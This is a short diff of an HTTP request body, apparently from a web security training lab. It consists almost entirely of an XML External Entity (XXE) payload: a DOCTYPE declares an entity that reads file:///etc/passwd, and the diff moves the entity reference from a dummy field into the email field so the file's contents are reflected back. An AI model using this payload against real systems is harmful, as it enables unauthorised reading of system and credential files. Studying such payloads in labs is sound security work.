@@ -23,5 +23,5 @@ Sec-Gpc: 1
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<request><email>wiener1%40normal-user.net</email><rand>987265344</rand><tenant>1</tenant><fakevar>&xxe;</fakevar><mod>update
+<request><email>&xxe;</email><rand>987265344</rand><tenant>1</tenant><fakevar>123</fakevar><mod>update
 </mod></request>
